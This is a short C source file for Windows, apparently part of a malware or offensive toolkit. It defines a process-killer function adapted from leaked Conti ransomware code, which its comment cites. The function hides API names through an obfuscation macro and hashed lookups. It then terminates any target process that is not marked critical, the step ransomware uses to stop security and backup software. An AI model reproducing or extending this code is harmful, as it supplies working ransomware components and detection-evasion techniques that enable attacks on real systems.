#include "7layers.h"
#include "debug.h"
#include "obfuscation.h"
#include "procsys.h"

int terminate_by_pid(DWORD pid) {
    // https://github.com/gharty03/Conti-Ransomware/blob/main/locker/process_killer.cpp

    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE,
        FALSE,
        pid
    );

    if (!hProcess) return -1;

    NTSTATUS(WINAPI * pNtQueryInformationProcess)(
        HANDLE,
        PROCESSINFOCLASS,
        PVOID,
        ULONG,
        PULONG
    );


    HMODULE hNtdll = LoadLibraryA(OBF("ntdll.dll"));

    // [+] NtQueryInformationProcess: SALT[0xF6DF2E6DUL] HASH[0xF0F62825UL]

    pNtQueryInformationProcess = (NTSTATUS(WINAPI*)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
    ))GetProcAddress(
        hNtdll,
        OBF("NtQueryInformationProcess")
    );

    ULONG IsCriticalProcess;
    ULONG Size;
    NTSTATUS Status = pNtQueryInformationProcess(
        hProcess,
        ProcessBreakOnTermination,
        &IsCriticalProcess,
        sizeof(ULONG),
        &Size
    );

    if (NT_ERROR(Status)) {
        return -1;
    }

    if (!IsCriticalProcess) {
        TerminateProcess(hProcess, EXIT_SUCCESS);
    }

    CloseHandle(hProcess);
    return 0;
}